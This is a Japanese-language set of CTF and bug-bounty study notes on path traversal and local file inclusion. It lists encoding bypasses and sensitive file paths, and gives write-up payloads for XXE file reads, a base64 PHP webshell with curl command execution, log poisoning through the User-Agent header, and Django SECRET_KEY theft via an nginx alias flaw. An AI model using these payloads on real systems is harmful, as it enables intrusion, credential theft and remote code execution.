<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [概要](#%E6%A6%82%E8%A6%81)
- [writeup](#writeup)
  - [bypass filter "." with "%E3%80%82" (hackerone)](#bypass-filter--with--hackerone)
  - [python / bypass nginx WAF with "?" / "/proc/self/maps" (ångstromCTF 2020 - LeetTube)](#python--bypass-nginx-waf-with---procselfmaps-%C3%A5ngstromctf-2020---leettube)
  - [XXE (SHARKY CTF 2020 XXEXTERNALXX)](#xxe-sharky-ctf-2020-xxexternalxx)
  - [LFI with /var/lib/php/sessions/sess\_\<PHPSESSID\> / upload base64 webshell "php://filter/convert.base64-decode/resource=" (Meepwn CTF Quals 2018 Mapl Story)](#lfi-with-varlibphpsessionssess%5C_%5Cphpsessid%5C--upload-base64-webshell-phpfilterconvertbase64-decoderesource-meepwn-ctf-quals-2018-mapl-story)
  - [convert flag to image file with "php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource" (Insomni'hack teaser 2018 - Cool Storage Service)](#convert-flag-to-image-file-with-phpfilterconverticonvibm1154utf-32beresource-insomnihack-teaser-2018---cool-storage-service)
  - [php://filter/convert.iconv.UTF8.IBM1154 (HITCON CTF 2018 - One Line PHP Challenge)](#phpfilterconverticonvutf8ibm1154-hitcon-ctf-2018---one-line-php-challenge)
  - [Log Poisoning / "/proc/self/fd/7" (Byte Bandits CTF 2018 R3M3MB3R)](#log-poisoning--procselffd7-byte-bandits-ctf-2018-r3m3mb3r)
  - [nginx.conf alias traversal / get SECRET_KEY from Django's settings.py (inshack-2019 unchained)](#nginxconf-alias-traversal--get-secret_key-from-djangos-settingspy-inshack-2019-unchained)
  - [](#)
  - [](#-1)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# 概要
https://security.stackexchange.com/questions/74538/alternative-ways-to-exploit-this-path-traversal/74614#74614  
以下でバイパスできるかも？？  
```txt 
/ %2f %u2215 %252f %c0%af, %e0%80%af, %c0%2f
\ %5c %u2216 %255c %c0%5c, %c0%80%5c
.     %u002e %252e %c0%2e, %e0%40%ae, %c0ae
```
nginx 0.6.36以前ではDirectory Traversalの脆弱性がある。  
https://www.exploit-db.com/exploits/12804  
  
LFIできるときに試すやつリスト。  
```txt
/etc/passwd できないときもある。その時は以下で
../etc/passwd ルートディレクトリまでの../の数を特定する

/etc/shadow
/etc/apache2
/etc/apache2/apache2.conf 
/etc/apache2/envvars: default environment variables for apache2ctlとか
/etc/apache2/sites-enabled/000-default.conf: vhost configとか
/etc/os-release: Debian GNU/Linux 9 (stretch)とか

/proc/self/environ プロセスの環境変数を取得
/proc/self/status: apache2とか
/proc/self/mem 実際のメモリへのシンボリックリンク
/proc/self/maps メモリマップを確認
/proc/self/fd/2: logs, same as /var/log/apache2/error.logとか
/proc/self/fd/7: logs, same as /var/log/apache2/access.logとか

/var/www/html

php://filter/convert.base64-encode/resource=index.php
php://filter/resource=index.php
php://input
data://text/plain,<?php%20print_r(scandir(%27./%27));
data:text/plain,base64,[base64] Base64を埋め込む
expect://ls
```
# writeup
## bypass filter "." with "%E3%80%82" (hackerone)
https://hackerone.com/reports/291750  
- **entrypoint**  
`.`は`%E3%80%82`として`。`のURLエンコードでバイパスできるかもらしい。  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub.com`はLinkがBlockされるけど、`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`で
バイパスできる！  
- **payload**  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`  
## python / bypass nginx WAF with "?" / "/proc/self/maps" (ångstromCTF 2020 - LeetTube)
https://blog.srikavin.me/posts/angstromctf-leettube/  
- **entrypoint**  
ソースの以下の部分がパストラバーラルの脆弱性がある。 
`/videos/../../../`みたいにしてファイルを読みだせる！  
```python
			self.path = urllib.parse.unquote(self.path)
			if self.path.startswith('/videos/'):
				file = os.path.abspath('.'+self.path)
				try: video = open(file, 'rb', 0)
```
ただnginxのWAFが上記のリクエストをフィルタリングして400 bad requestを返してしまう。  
`https://leettube.2020.chall.actf.co/videos/../?/../../`みたいにすると、WAFは`?`以降をクエリとしてそこは見ない。python側では`?`フォルダに一回入ってから`../`で抜けるみたいな意味になるらしい？？  
flagは`flag.txt`みたいな感じじゃなくて`.mp4`に書き込まれてるらしくてメモリ上から抜き出す。  
`/proc/self/maps`でメモリマップ(どのアドレスがどうとか)がわかり、`/proc/self/mem`で実際のメモリを呼び出せるらしい。  
以下のように`Range`ヘッダで指定したアドレスを抜き出せるっぽい？？？  
これで`.mp4`のヘッダを表す`66 74 79 70`というパターンを見つけるとFlagがある。  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
- **payload**  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
## XXE (SHARKY CTF 2020 XXEXTERNALXX)
https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/  
- **entrypoint**  
`?xml=aaaa`としてURLでアクセスすると`file_get_contents(aaaa): failed to open stream: No such file or directory`というエラーが表示されることから、`aaaa`をファイルとして開こうとしていることがわかる。  
また、`loadXML(): Empty string supplied as input`とかのerrorも出ており、開いたファイルをXML解析しようとしていることがわかる。つまり、XXEすればよい！  
`file_get_contents`は`http://`みたいに外部のURLを指定してもOK。  
以下のXXEのためのファイルを攻撃者サーバーに用意しておいてアクセスさせる。  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
- **payload**  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
## LFI with /var/lib/php/sessions/sess\_\<PHPSESSID\> / upload base64 webshell "php://filter/convert.base64-decode/resource=" (Meepwn CTF Quals 2018 Mapl Story)
https://ctftime.org/writeup/10418  
https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html  
- **entrypoint**  
`include($_GET['page'])`で明らかにLFIができるが、GET,POST経由のデータはすべて`(`,`)`,`//`,`` ` ``が削除されている。  
`?page=/etc/passwd`みたいにはできる。  
`flag.txt`みたいな感じでフラグはなくて、どっかにあるのでRCEして探す必要があるのが前提。  
`/var/lib/php/sessions/sess_<PHPSESSID>`にあるセッションファイルにアクセスすると、何らかの暗号化されたデータ的なのがあって、それを使ってCookieにある`hash('sha256','admin'.$salt)`で生成されている文字列の`$salt`を復号するらしい。  
これを復号してadminとしてログインする。  
adminは`"uploads/".md5($salt.$email)."/command.txt`に任意の19文字以内の文字を書き込めるらしい。ただし、GET,POST経由では`(`,`)`,`//`,`` ` ``が削除されるので、``<?=`$_GET[1]`;``などの最短のwebshellは設置できない…。  
`<?=include"$_COOKIE[0]`を書き込めば、COOKIEから値を読みだすので`(`とかは削除されなくなる！！  
ただし`include`関数ではRCEできないので、`command.txt`に書き込んだBase64エンコードしたWebshellを`sess_<PHPSESSID>`に書き込んだincludeで読み込みたい！  
つまり、`sess_<PHPSESSID>`に`<?=include"$_COOKIE[0]`を書き込んで、`?page=/var/lib/php/sessions/sess_<PHPSESSID>`でLFIして`include`関数を実行する。  
その引数はCOOKIE経由で渡し、内容は`php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'`で`command.txt`には``<?=`$_GET[1]`;``がbase64 encodeされたものが書かれている。  
```txt
// ほんとはcommand.txtに<?=`$_GET[1]`;を書き込みたいがそれができないのでbase64エンコードしたものを書き込んでおいてそれをデコードする
// これだと中身がbase64エンコードされたものをincludeするのでダメ
include("upload/56cea464131b6903185abfe3d6103385/command.txt")

// これで中身がbase64デコードしてからincludeできる
include("php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt")

// 以下みたいなことはどうやらできないらしい…。
include("php://filter/convert.base64-decode/resource=data:text/plain,base64,PD89YCRfR0VUWzFdYDs=")
// これはdata://がallow_url_includeが0になっており禁止されている。そもそもこれができるならRFIできる
include("data://text/plain,%3C%3F%3D%60%24_GET%5B1%5D%60%3B)
```
したがって、以下のように`ls`コマンドを実行できるらしい。  
```txt
Ξ ~ → curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'      
character_name|s:96:"d1f197d11ed6b3d29f08a9893429eb2bfa19e4543ff1d33bf19c5a89aec19b45080a355c37b4654ec2a5813f81dbe98b";user|s:96:"917467323f3a8e09ab1c2a2d7e3dc3ac85c0c4f08622b7e10a4ec4a18ad36e9919326131b516d9053ee8980a1230ad0e";action|s:65:"[02:27:52am GMT+7] gave blackpig to player admin.php
assets
character.php
dbconnect.php
die.php
game.php
home.php
index.php
login.php
logout.php
mapl_library.php
register.php
setting.php
style.css
upload
1
```
- **payload**  
`/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24`  
```txt
<?=include"$_COOKIE[0]
```
`upload/56cea464131b6903185abfe3d6103385/command.txt`  
(``<?=`$_GET[1]`;``のBase64エンコード)  
```txt
PD89YCRfR0VUWzFdYDs=
```
以下でlsコマンドを実行  
```txt
curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'   
```
## convert flag to image file with "php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource" (Insomni'hack teaser 2018 - Cool Storage Service)
https://gynvael.coldwind.pl/?lang=en&id=671  
- **entrypoint**  
fileをアップロードできるWebサイトがある。アップロードしたパスにはHTTPではアクセスできないらしい。  
管理者は画像のURLを指定してダウンロードもできるらしい。  
ダウンロードには`php://`が禁止されていないらしい。  
`.php`,`.php{3-7}`,`.phtml`, `.php.xyz`あたりのアップロードしたあとに`php://filter/resource`でアクセスすることを試したけどダメだったらしい。  
また、`php://filter/resource=/flag`をしても、読み込んだコンテンツが画像ファイルかどうかをチェックしているため、画像ファイルしか読み込めないようになっているらしい。  
ここで、`php://filter/convert.iconv`機能を使えば、読み込んだファイルを別の文字コードに変換できるらしい。  
`php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag`として`UTF-32BE`(webp画像ファイル)として変換すると、チェックをバイパスできるらしい。  
これによって読み込んだ、画像ファイルに変換されたflagファイルを以下で元に戻してFlagゲット。  
```php
<?php
$d = file_get_contents(
 "php://filter/convert.iconv.UTF-32BE%2fIBM1154/resource=".
 "data:image/png;base64,AAAEWAAAACsAAARbAAAAIwAABFsAAAA/AA".
 "AAKAAAAC8AAAA+AAAAYAAABCoAAAQFAAAEAwAABAYAAAAlAAAALwAABD".
 "AAAACtAAAEUwAAAC8AAAA+AAAEDgAABAMAAAQFAAAEBwAAAD8AAAA/AA".
 "AEBAAABAYAAAA/AAAEDAAAAGAAAAA/AAAEDwAAACcAAACO");
echo $d;
```
- **payload**  
```txt
php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag
```
## php://filter/convert.iconv.UTF8.IBM1154 (HITCON CTF 2018 - One Line PHP Challenge)
https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/B1A2JIjjm?type=view  
- **entrypoint**  
よくわからんけどconvertで変換される先をなんやかんやして`@<?php`から始まるように整形するらしい。  
めっちゃ大変そう。  
- **payload**  
```txt
POST /?orange=php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=/var/lib/php/sessions/sess_5uu8r952rejihbg033m5mckb17&1=var_dump(file_get_contents('/flag'));system('/read_flag'); HTTP/1.1
Host: 54.250.246.238
Proxy-Connection: keep-alive
Content-Length: 27912
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: §null§
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17

------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<data info of POC>
<long padding (guarantee to generate upload progress file)>
------WebKitFormBoundary2rwkUEtFdqhGMHqV--
```
## Log Poisoning / "/proc/self/fd/7" (Byte Bandits CTF 2018 R3M3MB3R)
https://rawsec.ml/en/ByteBanditsCTF-2018-write-ups/#200-r3m3mb3r-web  
https://ctftime.org/writeup/9616  
- **entrypoint**  
`http://web.euristica.in/R3M3MB3R/index.php?f=eg.php`でLFIできるよっていうヒントが問題文にある。  
`/R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log`  
または  
`/R3M3MB3R/index.php?f=/proc/self/fd/7`でLogファイルにアクセスできるので、  
以下のようにUser-AgentにPHPを仕込んでLog Poisoningする。  
```txt
GET /R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log HTTP/1.1
Host: web.euristica.in
Upgrade-Insecure-Requests: 1
User-Agent: <?php system('ls /var/www/html/');?>
```
- **payload**  
`/R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log`  
または  
`/R3M3MB3R/index.php?f=/proc/self/fd/7`  
## nginx.conf alias traversal / get SECRET_KEY from Django's settings.py (inshack-2019 unchained)
https://github.com/InsecurityAsso/inshack-2019/blob/master/unchained/writeup.md  
- **entrypoint**  
よくわからんけど多分Cookieの値を`"admin"`で署名しないとFlagが取れない的なヒントが書かれていて、いろんなファイルが配布されている。  
`nginx.conf`が以下のように`location /static {`で`/static/`のように後ろの`/`を付け忘れているのが脆弱。  
```txt
# static files
location /static {
    alias /srv/app/static/;
}
```
後ろでDjangoが動いていることがわかるので、DjangoのファイルをPath Traversalで読み取って署名に使うSECRET_KEYをゲットすれば、セッションを任意の値にセットできる！  
```txt
https://unchained.ctf.insecurity-insa.fr/static../unchained/settings.py
```
これでSECRET_KEYをゲットしてCookieを改竄すればFlagゲット？？  
- **payload**  
```txt
https://unchained.ctf.insecurity-insa.fr/static../unchained/settings.py
```
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
# メモ
https://www.hamayanhamayan.com/entry/2020/08/30/110845  
